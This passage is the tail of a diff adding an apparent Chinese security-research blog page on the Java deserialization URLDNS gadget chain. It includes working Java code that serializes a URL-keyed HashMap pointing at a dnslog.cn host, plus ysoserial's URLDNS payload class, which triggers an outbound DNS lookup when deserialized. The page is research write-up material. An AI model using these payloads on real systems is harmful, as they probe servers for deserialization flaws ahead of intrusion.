+		hashMap<span style=color:#f92672>.</span><span style=color:#a6e22e>put</span><span style=color:#f92672>(</span>url<span style=color:#f92672>,</span> 0<span style=color:#f92672>);</span>
+		f<span style=color:#f92672>.</span><span style=color:#a6e22e>set</span><span style=color:#f92672>(</span>url<span style=color:#f92672>,</span> <span style=color:#f92672>-</span>1<span style=color:#f92672>);</span>
+
+		ObjectOutputStream oos <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectOutputStream<span style=color:#f92672>(</span><span style=color:#66d9ef>new</span> FileOutputStream<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;urldns.bin&#34;</span><span style=color:#f92672>));</span>
+		oos<span style=color:#f92672>.</span><span style=color:#a6e22e>writeObject</span><span style=color:#f92672>(</span>hashMap<span style=color:#f92672>);</span>
+		ObjectInputStream ois <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectInputStream<span style=color:#f92672>(</span><span style=color:#66d9ef>new</span> FileInputStream<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;urldns.bin&#34;</span><span style=color:#f92672>));</span>
+		ois<span style=color:#f92672>.</span><span style=color:#a6e22e>readObject</span><span style=color:#f92672>();</span>
+	<span style=color:#f92672>}</span>
+<span style=color:#f92672>}</span>
+
+<span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>URLDNS2</span> <span style=color:#f92672>{</span>
+
+	<span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span><span style=color:#f92672>(</span>String<span style=color:#f92672>[]</span> args<span style=color:#f92672>)</span> <span style=color:#66d9ef>throws</span> Exception <span style=color:#f92672>{</span>
+
+		HashMap<span style=color:#f92672>&lt;</span>URL<span style=color:#f92672>,</span> Integer<span style=color:#f92672>&gt;</span> hashMap <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> HashMap<span style=color:#f92672>&lt;&gt;();</span>
+		URL                   url     <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> URL<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;http://su18.dnslog.cn&#34;</span><span style=color:#f92672>);</span>
+
+		Method<span style=color:#f92672>[]</span> m <span style=color:#f92672>=</span> Class<span style=color:#f92672>.</span><span style=color:#a6e22e>forName</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;java.util.HashMap&#34;</span><span style=color:#f92672>).</span><span style=color:#a6e22e>getDeclaredMethods</span><span style=color:#f92672>();</span>
+		<span style=color:#66d9ef>for</span> <span style=color:#f92672>(</span>Method method <span style=color:#f92672>:</span> m<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+			<span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>method<span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>().</span><span style=color:#a6e22e>equals</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;putVal&#34;</span><span style=color:#f92672>))</span> <span style=color:#f92672>{</span>
+				method<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
+				method<span style=color:#f92672>.</span><span style=color:#a6e22e>invoke</span><span style=color:#f92672>(</span>hashMap<span style=color:#f92672>,</span> <span style=color:#f92672>-</span>1<span style=color:#f92672>,</span> url<span style=color:#f92672>,</span> 0<span style=color:#f92672>,</span> <span style=color:#66d9ef>false</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
+			<span style=color:#f92672>}</span>
+		<span style=color:#f92672>}</span>
+
+		ObjectOutputStream oos <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectOutputStream<span style=color:#f92672>(</span><span style=color:#66d9ef>new</span> FileOutputStream<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;urldns2.bin&#34;</span><span style=color:#f92672>));</span>
+		oos<span style=color:#f92672>.</span><span style=color:#a6e22e>writeObject</span><span style=color:#f92672>(</span>hashMap<span style=color:#f92672>);</span>
+		ObjectInputStream ois <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectInputStream<span style=color:#f92672>(</span><span style=color:#66d9ef>new</span> FileInputStream<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;urldns2.bin&#34;</span><span style=color:#f92672>));</span>
+		ois<span style=color:#f92672>.</span><span style=color:#a6e22e>readObject</span><span style=color:#f92672>();</span>
+	<span style=color:#f92672>}</span>
+<span style=color:#f92672>}</span>
+</code></pre></div><h4 id=ysoserial-实现url-dns>ysoserial 实现URL DNS</h4>
+<p>下载
+<a href=https://github.com/frohoff/ysoserial target=_blank>源码</a>,URLDNS实现如下，很明显采用的时第一种方法，在put之后，通过反射修改对应的值。</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>URLDNS</span> <span style=color:#66d9ef>implements</span> ObjectPayload<span style=color:#f92672>&lt;</span>Object<span style=color:#f92672>&gt;</span> <span style=color:#f92672>{</span>
+
+        <span style=color:#66d9ef>public</span> Object <span style=color:#a6e22e>getObject</span><span style=color:#f92672>(</span><span style=color:#66d9ef>final</span> String url<span style=color:#f92672>)</span> <span style=color:#66d9ef>throws</span> Exception <span style=color:#f92672>{</span>
+
+                <span style=color:#75715e>//Avoid DNS resolution during payload creation
+</span><span style=color:#75715e></span>                <span style=color:#75715e>//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.
+</span><span style=color:#75715e></span>                URLStreamHandler handler <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> SilentURLStreamHandler<span style=color:#f92672>();</span>
+
+                HashMap ht <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> HashMap<span style=color:#f92672>();</span> <span style=color:#75715e>// HashMap that will contain the URL
+</span><span style=color:#75715e></span>                URL u <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> URL<span style=color:#f92672>(</span><span style=color:#66d9ef>null</span><span style=color:#f92672>,</span> url<span style=color:#f92672>,</span> handler<span style=color:#f92672>);</span> <span style=color:#75715e>// URL to use as the Key
+</span><span style=color:#75715e></span>                ht<span style=color:#f92672>.</span><span style=color:#a6e22e>put</span><span style=color:#f92672>(</span>u<span style=color:#f92672>,</span> url<span style=color:#f92672>);</span> <span style=color:#75715e>//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.
+</span><span style=color:#75715e></span>
+                Reflections<span style=color:#f92672>.</span><span style=color:#a6e22e>setFieldValue</span><span style=color:#f92672>(</span>u<span style=color:#f92672>,</span> <span style=color:#e6db74>&#34;hashCode&#34;</span><span style=color:#f92672>,</span> <span style=color:#f92672>-</span>1<span style=color:#f92672>);</span> <span style=color:#75715e>// During the put above, the URL&#39;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.
+</span><span style=color:#75715e></span>
+                <span style=color:#66d9ef>return</span> ht<span style=color:#f92672>;</span>
+        <span style=color:#f92672>}</span>
+
+        <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span><span style=color:#f92672>(</span><span style=color:#66d9ef>final</span> String<span style=color:#f92672>[]</span> args<span style=color:#f92672>)</span> <span style=color:#66d9ef>throws</span> Exception <span style=color:#f92672>{</span>
+                PayloadRunner<span style=color:#f92672>.</span><span style=color:#a6e22e>run</span><span style=color:#f92672>(</span>URLDNS<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> args<span style=color:#f92672>);</span>
+        <span style=color:#f92672>}</span>
+
+        <span style=color:#75715e>/**
+</span><span style=color:#75715e>         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.
+</span><span style=color:#75715e>         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior
+</span><span style=color:#75715e>         * using the serialized object.&lt;/p&gt;
+</span><span style=color:#75715e>         *
+</span><span style=color:#75715e>         * &lt;b&gt;Potential false negative:&lt;/b&gt;
+</span><span style=color:#75715e>         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the
+</span><span style=color:#75715e>         * second resolution.&lt;/p&gt;
+</span><span style=color:#75715e>         */</span>
+        <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>SilentURLStreamHandler</span> <span style=color:#66d9ef>extends</span> URLStreamHandler <span style=color:#f92672>{</span>
+
+                <span style=color:#66d9ef>protected</span> URLConnection <span style=color:#a6e22e>openConnection</span><span style=color:#f92672>(</span>URL u<span style=color:#f92672>)</span> <span style=color:#66d9ef>throws</span> IOException <span style=color:#f92672>{</span>
+                        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
+                <span style=color:#f92672>}</span>
+
+                <span style=color:#66d9ef>protected</span> <span style=color:#66d9ef>synchronized</span> InetAddress <span style=color:#a6e22e>getHostAddress</span><span style=color:#f92672>(</span>URL u<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+                        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
+                <span style=color:#f92672>}</span>
+        <span style=color:#f92672>}</span>
+<span style=color:#f92672>}</span>
+	<span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>setFieldValue</span><span style=color:#f92672>(</span><span style=color:#66d9ef>final</span> Object obj<span style=color:#f92672>,</span> <span style=color:#66d9ef>final</span> String fieldName<span style=color:#f92672>,</span> <span style=color:#66d9ef>final</span> Object value<span style=color:#f92672>)</span> <span style=color:#66d9ef>throws</span> Exception <span style=color:#f92672>{</span>
+		<span style=color:#66d9ef>final</span> Field field <span style=color:#f92672>=</span> getField<span style=color:#f92672>(</span>obj<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>(),</span> fieldName<span style=color:#f92672>);</span>
+		field<span style=color:#f92672>.</span><span style=color:#a6e22e>set</span><span style=color:#f92672>(</span>obj<span style=color:#f92672>,</span> value<span style=color:#f92672>);</span>
+	<span style=color:#f92672>}</span>
+</code></pre></div><p><strong>参考链接</strong></p>
+<blockquote>
+<p>
+<a href=https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/ target=_blank>https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/</a></p>
+<p>
+<a href=https://su18.org/post/ysoserial-su18-1/#%E5%9B%9B-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-gadget-%E5%88%86%E6%9E%90 target=_blank>https://su18.org/post/ysoserial-su18-1/#%E5%9B%9B-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-gadget-%E5%88%86%E6%9E%90</a></p>
+</blockquote>
+<p><strong>Created at 2024-01-08T16:57:37+08:00</strong></p>
+<div class=last_mod>
+创建于:Monday, January 8,2024
+</div>
+<div class=last_mod>
+最后修改于: Monday, January 8,2024
+</div>
+<div class=article-container></div>
+<script src=https://utteranc.es/client.js repo=CppXL/blog_comment issue-term=pathname theme=github-light crossorigin=anonymous async></script>
+</div>
+<div id=comments>
+</div>
+<footer class=footline>
+</footer>
+</div>
+</div>
+<div id=navigation>
+<a class="nav nav-prev" href=/zh-cn/research/web/java-deserialization/commonsbeanutils1-chain/ title="CommonsBeanutils1 Chain"> <i class="fa fa-chevron-left"></i></a>
+<a class="nav nav-next" href=/zh-cn/research/web/php-filter-rce/ title="PHP Filter RCE 分析" style=margin-right:0><i class="fa fa-chevron-right"></i></a>
+</div>
+</section>
+<div style=left:-1000px;overflow:scroll;position:absolute;top:-1000px;border:none;box-sizing:content-box;height:200px;margin:0;padding:0;width:200px>
+<div style=border:none;box-sizing:content-box;height:200px;margin:0;padding:0;width:200px></div>
+</div>
+<script src=/js/clipboard.min.js?1706695571></script>
+<script src=/js/perfect-scrollbar.min.js?1706695571></script>
+<script src=/js/perfect-scrollbar.jquery.min.js?1706695571></script>
+<script src=/js/jquery.sticky.js?1706695571></script>
+<script src=/js/featherlight.min.js?1706695571></script>
+<script src=/js/highlight.pack.js?1706695571></script>
+<script>hljs.initHighlightingOnLoad()</script>
+<script src=/js/modernizr.custom-3.6.0.js?1706695571></script>
+<script src=/js/learn.js?1706695571></script>
+<script src=/js/hugo-learn.js?1706695571></script>
+<script src=/mermaid/mermaid.js?1706695571></script>
+<script>mermaid.initialize({startOnLoad:!0})</script>
+<script>(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)})(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-105947713-1','auto'),ga('send','pageview')</script>
+</body>
+</html>
